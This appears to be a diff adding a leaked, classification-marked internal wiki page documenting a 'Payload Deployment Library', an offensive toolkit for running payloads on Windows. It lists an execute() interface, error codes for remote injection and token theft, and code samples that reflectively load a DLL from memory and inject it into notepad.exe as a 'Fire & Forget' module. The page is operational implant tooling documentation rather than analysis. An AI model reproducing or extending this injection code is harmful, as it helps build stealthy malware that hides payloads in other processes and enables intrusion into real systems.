@@ -1,0 +1,195 @@
+
+                        Payload Deployment Library
+SECRET//NOFORN
+ 
+Payload Deployment API
+<iframe src="https://osb-doxygen.devlan.net/payloaddeployment/" noborder="0" width="100%" height="1000" scrolling="yes" seamless></iframe>
+ 
+Stash Repository: Payload Deployment Library
+ 
+Interface Description:
+The interface for the Payload Deployment Library specifies an execute function be written. The prototype is as follows:
+ 
+virtual PayloadErr execute(LPBYTE payload, DWORD payloadSize, LPVOID params, DWORD paramsSize, LPHANDLE returnHandle);
+
+payload [in]: pointer to an array of BYTEs containing the module to be deployedpayloadSize [in]: size, in bytes, of the payloadparams [in, opt]: pointer to struct containing the module's argumentsparamsSize [in, opt]: size, in bytes, of the params structreturnHandle [out, opt]: pointer to HANDLE of the loaded module. (not always used)
+Returns a PayloadErr. PayloadErr values are described in the Library Error Codes section. 
+Library Conventions: Describe any and all conventions submissions should adhere to for this library. Applying a naming convention can help with the organization of the library. 
+Payload Deployment Member List:
+ 
+ 
+Error Code Descriptions: List error codes with descriptions. Use either a bulleted list or the code block macro. Remember, error codes must be compatible with the SUCCEEDED() and FAILED() macros.
+
+  Error Codes List
+ 	enum PayloadErr : int
+	{
+		ePD_ERROR_SUCCESS = 0, // generic success
+ 
+		ePD_ERROR_GENERIC = -1, // generic failure
+ 
+		// Error return codes: File errors
+		ePD_ERROR_FILE = -10, // there was an issue opening the desired file
+		ePD_ERROR_FILE_IO = -11, // there was an issue reading or writing to a file
+ 
+		// Error return codes: Bad payload
+		ePD_ERROR_INVALID_PE = -20, // the payload is not a valid PEPrivilege Escalation file
+		ePD_ERROR_WRONG_PE_ARCHITECTURE = -21, // the payload does not match the architecture of the executing process
+		ePD_ERROR_MOD_NOT_FOUND = -22, // a required dependency module could not be found
+		
+		// Error return codes: Memory errors
+		ePD_ERROR_MEMORY = -30,
+		ePD_ERROR_MEMORY_REMOTE = -31,
+ 
+		// Error return codes: Payload errors
+		ePD_ERROR_INIT_FAILED = -41, // there was an error calling the PE's entry point
+		ePD_ERROR_UNLOAD_FAILED = -42, // there was an error unloading the PE
+		ePD_ERROR_PROC_NOT_FOUND = -43, // the address of the exported function could not be found (DLLDynamic Link Library only)
+		ePD_ERROR_EXPORTED_FUNCTION = -44, // the exported function returned a failure result
+		ePD_ERROR_EXPORTED_FUNCTION_NON_CRITICAL = -45, // the exported function return a non-critical failure result
+		ePD_ERROR_EXPORTED_FUNCTION_CRITICAL = -46, // the exported function return a critical failure result
+ 
+		// Error return codes: Parameter errors
+		ePD_ERROR_INVALID_PARAMS = -50, // the module received invalid params
+		ePD_ERROR_VERSION_NOT_SUPPORTED = -51, // the version of module is not supported
+		ePD_ERROR_WRONG_BEHAVIOR = -52, // the requested behavior is not supported
+ 
+		// Error return codes: Remote Injection errors
+		ePD_ERROR_REMOTE_PROCESS_NOT_FOUND = -60, // the target process could not be found (invalid PIDProcess ID)
+		ePD_ERROR_REMOTE_PROCESS_ACCESS_DENIED = -61, // the target process could not be opened with the required permissions
+		ePD_ERROR_REMOTE_THREAD_CREATION_FAILED = -62, // could not create a remote thread
+		ePD_ERROR_REMOTE_PROCESS_WRONG_PE_ARCHITECTURE = -63,
+ 
+		// Error return codes: WMI/COM errors
+		ePD_ERROR_WMI_INIT = -70,			//Initialization of WMIWindows Management Instrumentation Object failed
+		ePD_ERROR_COM_INIT = -71,			//Failed to init COM
+		ePD_ERROR_COM_CLASS_CREATE = -72,	//Failed to obtain a class in COM
+		
+		// Error return codes: Pipe errors
+		ePD_ERROR_FAILED_PIPE_CREATE = -80,		//Failed to create the pipe
+ 
+		// Error return codes: Sessions/Tokens
+		ePD_ERROR_NO_SESSION = -90,				//Failed to grab the session of id of the requested user
+		ePD_ERROR_FAILED_GET_TOKEN = -91		//Failed to get the appropriate token
+ 
+	};
+
+
+Code Sample Using The Library Interface:
+
+
+Reflectively load ImprovedDummyDll into the current process
+// reflectively loads improvedDummyDll into the current process
+
+LoadFireAndForgetFromMemory_INTD *pFireAndForget = NULL;
+PMODULE_REMOTE_ARGS pRemoteArgs = NULL; 
+HANDLE hFireAndForgetThread = INVALID_HANDLE_VALUE;
+
+pFireAndForget = new LoadFireAndForgetFromMemory_INTD;
+pRemoteArgs = new MODULE_REMOTE_ARGS;
+
+pRemoteArgs->version = 2;
+wcscpy_s(pRemoteArgs->cmdline, L"arg1 arg2 arg3");
+
+if (IPayload::ePD_ERROR_SUCCESS == pFireAndForget->execute(improvedDummyDll, sizeof(improvedDummyDll), pRemoteArgs, sizeof(MODULE_REMOTE_ARGS), &hFireAndForgetThread) && hFireAndForgetThread != NULL)
+{
+    WaitForSingleObject(hFireAndForgetThread, 120000);
+	CloseHandle(hFireAndForgetThread);
+}
+
+delete(pFireAndForget);
+pFireAndForget = NULL;
+
+
+Inject improvedDummyDll into notepad.exe
+ // Injects improvedDummyDll into notepad.exe
+ 
+IPayload::PayloadErr retVal;
+HANDLE hProc = NULL;
+ 
+retVal = InjectLibraryFromMemory::OpenProcessByName(&hProc, L"notepad.exe");
+ 
+if (SUCCEEDED(retVal) && hProc != NULL)
+{
+	InjectLibraryFromMemory myInject;
+	retVal = myInject.execute(improvedDummyDll, sizeof(improvedDummyDll), hProc, sizeof(HANDLE), NULL);
+	CloseHandle(hProc);
+}
+
+
+Inject ImprovedDummyDll into notepad.exe and call the FireAndForget v2.0 exported ordinal with a command line argument
+// Injects improvedDummyDll into notepad.exe as a Fire & Forget v2.0 module with a command line argument string
+ 
+IPayload::PayloadErr retVal;
+HANDLE hProc = NULL;
+DWORD dwFireAndForgetThreadExitCode = 0;
+HANDLE hFireAndForgetThread = INVALID_HANDLE_VALUE;
+ 
+retVal = InjectLibraryFromMemory::OpenProcessByName(&hProc, L"notepad.exe");
+ 
+if (SUCCEEDED(retVal) && hProc != NULL)
+{
+	InjectFireAndForgetFromMemory myFireAndForget;
+ 
+	// setup arguments structure -- these must be heap allocated with the new operator
+	PMODULE_INJECT_ARGS pInjectArgs = new MODULE_INJECT_ARGS;
+	// fire and forget args are a substructure
+	pInjectArgs->pRemoteArgs = new MODULE_REMOTE_ARGS;
+	// set remote process handle in args struct
+	pInjectArgs->hProcess = hProc;
+	// set fire and forget version in fire and forget substruct
+	pInjectArgs->pRemoteArgs->version = 2;
+	// set commandline in fire and forget substruct
+	wcscpy_s(pInjectArgs->pRemoteArgs->cmdline, L"Unit Test Command Line");
+ 
+	// execute will kick off the remote Fire & Forget thread, which we need to wait on to get the return code
+	retVal = myFireAndForget.execute(improvedDummyDll, sizeof(improvedDummyDll), pInjectArgs, sizeof(MODULE_INJECT_ARGS), &hFireAndForgetThread);
+	WaitForSingleObject(hFireAndForgetThread, INFINITE);
+	GetExitCodeThread(hFireAndForgetThread, &dwFireAndForgetThreadExitCode);
+ 
+ 
+	// NOTE: You don't need to CloseHandle on hProc, as the destructor for InjectFireAndForgetFromMemory closes it for you.
+	// NOTE: DO NOT delete the pInjectArgs or pInjectArgs->pRemoteArgs yourself -- these are cleaned up by the InjectFireAndForgetFromMemory inside its destructor.
+}
+
+
+ 
+ 
+SECRET//NOFORN
+
+Previous versions:
+| 1 SECRET
+| 2 SECRET
+| 3 SECRET
+| 4 SECRET
+| 5 SECRET
+| 6 SECRET
+| 7 SECRET
+| 8 SECRET
+| 9 SECRET
+| 10 SECRET
+| 11 SECRET
+| 12 SECRET
+| 13 SECRET
+| 14 SECRET
+| 15 SECRET
+| 16 SECRET
+| 17 SECRET
+| 18 SECRET
+| 19 SECRET
+| 20 SECRET
+| 21 SECRET
+| 22 SECRET
+| 23 SECRET
+| 24 SECRET
+| 25 SECRET
+| 26 SECRET
+| 27 SECRET
+| 28 SECRET
+| 29 SECRET
+| 30 SECRET
+| 31 SECRET
+| 32 SECRET
+| 33 SECRET
+| 34 SECRET
+|
+                    
